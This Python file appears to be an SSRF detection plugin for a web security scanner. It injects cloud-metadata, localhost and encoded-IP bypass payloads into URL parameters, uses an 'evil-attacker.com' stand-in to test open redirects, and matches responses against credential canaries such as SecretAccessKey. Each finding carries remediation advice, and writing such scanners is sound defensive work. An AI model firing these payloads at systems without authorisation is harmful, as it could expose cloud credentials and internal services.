"""
SSRF Plugin — Server-Side Request Forgery detection.

Maps to: OWASP API7:2023 — Server-Side Request Forgery

Strategy (blackbox, no OOB callback server):
  1. Inject cloud metadata / localhost URLs into common SSRF-prone parameters
  2. Detect server-side fetch via: metadata canaries in body, SSRF error strings, timing
  3. Detect open redirect chains that can be weaponized for SSRF
  4. Flag proxy/fetch endpoints for manual follow-up
"""

from __future__ import annotations

import asyncio
import time

from secforge.plugins.base import BasePlugin
from secforge.core.client import SecForgeClient
from secforge.models.evidence import Evidence
from secforge.models.finding import Finding
from secforge.models.enums import Severity, FindingStatus
from secforge.models.target import TargetConfig

# ── SSRF-prone parameter names ────────────────────────────────────────────────
SSRF_PARAMS = [
    "url", "uri", "link", "src", "dest", "destination",
    "redirect", "redirect_uri", "redirect_url",
    "callback", "callback_url", "webhook", "webhook_url",
    "endpoint", "proxy", "host", "next", "return",
]

# ── Payloads ──────────────────────────────────────────────────────────────────
CLOUD_META_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",       # AWS
    "http://169.254.169.254/metadata/v1/",            # DigitalOcean
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
]

LOCALHOST_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
]

BYPASS_PAYLOADS = [
    "http://0x7f000001/",    # Hex 127.0.0.1
    "http://2130706433/",    # Decimal 127.0.0.1
]

# Strings in response body that prove server resolved/fetched the URL
META_CANARIES = [
    "ami-id", "instance-id", "local-ipv4", "iam/security-credentials",
    "computeMetadata", "instance/attributes",
    "access_token", "AccessKeyId", "SecretAccessKey",
]

SSRF_ERROR_SIGNALS = [
    "connection refused", "connection timed out", "no route to host",
    "failed to connect", "could not resolve host", "name or service not known",
    "network is unreachable", "i/o timeout", "dial tcp", "getaddrinfo",
    "failed to fetch", "unable to connect",
]

# Paths that suggest a fetch/proxy endpoint
PROXY_PATHS = [
    "/api/proxy", "/api/fetch", "/api/request", "/proxy",
    "/fetch", "/webhook", "/callback", "/forward",
    "/api/v1/proxy", "/api/v1/fetch",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "next", "return",
    "goto", "continue", "url",
]


class SSRFPlugin(BasePlugin):
    """SSRF detection — OWASP API7:2023."""

    name = "ssrf"
    description = "Server-Side Request Forgery — cloud metadata, localhost probes, open redirect chains"
    owasp_id = "API7:2023"

    async def run(self, target: TargetConfig, client: SecForgeClient) -> list[Finding]:
        findings: list[Finding] = []

        results = await asyncio.gather(
            self._probe_ssrf_params(target, client),
            self._probe_open_redirects(target, client),
            self._check_proxy_endpoints(target, client),
            return_exceptions=True,
        )

        for r in results:
            if isinstance(r, list):
                findings.extend(r)

        return findings

    # ── 1. Inject SSRF payloads into common parameter names ───────────────────
    async def _probe_ssrf_params(self, target: TargetConfig, client: SecForgeClient) -> list[Finding]:
        findings: list[Finding] = []

        all_payloads = CLOUD_META_PAYLOADS + LOCALHOST_PAYLOADS + BYPASS_PAYLOADS[:1]

        for payload in all_payloads:
            for param in SSRF_PARAMS[:8]:  # top 8 most common
                path = f"/?{param}={payload}"
                try:
                    t0 = time.monotonic()
                    resp = await client.get(path)
                    elapsed = time.monotonic() - t0

                    body = ""
                    try:
                        body = resp.text[:4000]
                    except Exception:
                        pass

                    body_lower = body.lower()

                    # Check for cloud metadata secrets in response body
                    for canary in META_CANARIES:
                        if canary.lower() in body_lower:
                            findings.append(Finding(
                                plugin=self.name,
                                title="SSRF — Cloud Metadata Exposed",
                                severity=Severity.CRITICAL,
                                status=FindingStatus.CONFIRMED,
                                description=(
                                    f"The server fetched the injected URL `{payload}` via `?{param}=` "
                                    f"and returned cloud metadata in the response. "
                                    f"Canary `{canary}` found in body. "
                                    "An attacker can extract IAM credentials, instance tokens, or internal config."
                                ),
                                endpoint=f"{target.url}{path}",
                                evidence=[Evidence(
                                    request=f"GET {target.url}{path}",
                                    response_status=resp.status_code,
                                    response_body=body[:1000],
                                    notes=f"Canary '{canary}' found in response body",
                                )],
                                remediation=(
                                    "Block server-side HTTP requests to link-local (169.254.169.254) and "
                                    "private IP ranges. Use an allowlist of permitted external hosts. "
                                    "Validate and sanitize all URL parameters before making outbound requests."
                                ),
                            ))
                            return findings  # Critical — stop immediately

                    # Check for SSRF error signals (proves server tried to fetch)
                    for signal in SSRF_ERROR_SIGNALS:
                        if signal in body_lower:
                            findings.append(Finding(
                                plugin=self.name,
                                title="SSRF — Server-Side HTTP Request Detected",
                                severity=Severity.HIGH,
                                status=FindingStatus.PROBABLE,
                                description=(
                                    f"Injecting `{payload}` via `?{param}=` produced an error "
                                    f"message (`{signal}`) indicating the server attempted an outbound "
                                    "HTTP request to the injected URL. "
                                    "Confirm with an OOB callback server (e.g. Burp Collaborator)."
                                ),
                                endpoint=f"{target.url}{path}",
                                evidence=[Evidence(
                                    request=f"GET {target.url}{path}",
                                    response_status=resp.status_code,
                                    response_body=body[:500],
                                    notes=f"SSRF signal '{signal}' found in response",
                                )],
                                remediation=(
                                    "Sanitize URL parameters server-side. Block requests to RFC1918 "
                                    "private ranges and link-local addresses. Use an HTTP egress allowlist."
                                ),
                            ))
                            return findings

                    # Timing anomaly on cloud metadata probes
                    if "169.254.169.254" in payload and elapsed > 4.0:
                        findings.append(Finding(
                            plugin=self.name,
                            title="SSRF — Timing Anomaly on Metadata Probe",
                            severity=Severity.MEDIUM,
                            status=FindingStatus.PROBABLE,
                            description=(
                                f"`?{param}={payload}` took {elapsed:.1f}s — the server may be "
                                "attempting an outbound connection to 169.254.169.254 before timing out. "
                                "Verify with a Burp Collaborator payload."
                            ),
                            endpoint=f"{target.url}{path}",
                            evidence=[Evidence(
                                request=f"GET {target.url}{path}",
                                response_status=resp.status_code,
                                notes=f"Response took {elapsed:.1f}s (baseline ≪ 1s)",
                            )],
                            remediation="Validate that the application does not make outbound HTTP requests based on user-controlled URL parameters.",
                        ))

                except Exception:
                    pass

        # POST body probes
        for param in ["url", "redirect", "callback", "webhook"]:
            for payload in CLOUD_META_PAYLOADS[:1]:
                try:
                    resp = await client.post("/api/", json={param: payload})
                    body = ""
                    try:
                        body = resp.text[:2000]
                    except Exception:
                        pass
                    for canary in META_CANARIES:
                        if canary.lower() in body.lower():
                            findings.append(Finding(
                                plugin=self.name,
                                title="SSRF — Cloud Metadata via POST Body",
                                severity=Severity.CRITICAL,
                                status=FindingStatus.CONFIRMED,
                                description=(
                                    f"POST body `{{{param}: {payload}}}` returned cloud metadata. "
                                    f"Canary `{canary}` found in response."
                                ),
                                endpoint=f"{target.url}/api/",
                                evidence=[Evidence(
                                    request=f"POST {target.url}/api/ body={{{param}: {payload}}}",
                                    response_status=resp.status_code,
                                    response_body=body[:500],
                                )],
                                remediation="Block SSRF via POST body URL parameters. Validate all outbound URLs server-side.",
                            ))
                except Exception:
                    pass

        return findings

    # ── 2. Open redirect → SSRF escalation chain ──────────────────────────────
    async def _probe_open_redirects(self, target: TargetConfig, client: SecForgeClient) -> list[Finding]:
        findings: list[Finding] = []
        canary = "http://evil-attacker.com/"

        for param in REDIRECT_PARAMS:
            path = f"/?{param}={canary}"
            try:
                resp = await client.get(path, follow_redirects=False)
                location = resp.headers.get("Location", "")
                if "evil-attacker.com" in location:
                    findings.append(Finding(
                        plugin=self.name,
                        title="Open Redirect — SSRF Escalation Vector",
                        severity=Severity.MEDIUM,
                        status=FindingStatus.CONFIRMED,
                        description=(
                            f"The `{param}` parameter value is reflected directly into the "
                            "`Location` header without validation. While not direct SSRF, open "
                            "redirects can be chained with SSRF vulnerabilities and enable phishing."
                        ),
                        endpoint=f"{target.url}{path}",
                        evidence=[Evidence(
                            request=f"GET {target.url}{path}",
                            response_status=resp.status_code,
                            response_headers=dict(resp.headers),
                            notes=f"Location: {location}",
                        )],
                        remediation=(
                            "Validate redirect destinations against an allowlist of permitted domains. "
                            "Reject redirect parameters pointing to external hosts."
                        ),
                    ))
            except Exception:
                pass

        return findings

    # ── 3. Detect proxy/fetch endpoints ───────────────────────────────────────
    async def _check_proxy_endpoints(self, target: TargetConfig, client: SecForgeClient) -> list[Finding]:
        """Flag endpoints that look like fetch/proxy handlers for manual SSRF testing."""
        findings: list[Finding] = []

        for path in PROXY_PATHS:
            try:
                resp = await client.get(path)
                if resp.status_code not in (404, 410, 429):
                    findings.append(Finding(
                        plugin=self.name,
                        title="SSRF — Proxy/Fetch Endpoint Detected",
                        severity=Severity.MEDIUM,
                        status=FindingStatus.PROBABLE,
                        description=(
                            f"`{path}` returned HTTP {resp.status_code}. "
                            "Proxy and fetch endpoints are commonly vulnerable to SSRF. "
                            "Manual testing with internal URLs and an OOB callback (e.g. Burp Collaborator) recommended."
                        ),
                        endpoint=f"{target.url}{path}",
                        evidence=[Evidence(
                            request=f"GET {target.url}{path}",
                            response_status=resp.status_code,
                            notes="Endpoint exists — manual SSRF probe recommended",
                        )],
                        remediation=(
                            "If this endpoint is intentional, enforce strict URL allowlisting. "
                            "Block requests to RFC1918 ranges, localhost, and link-local addresses."
                        ),
                    ))
            except Exception:
                pass

        return findings
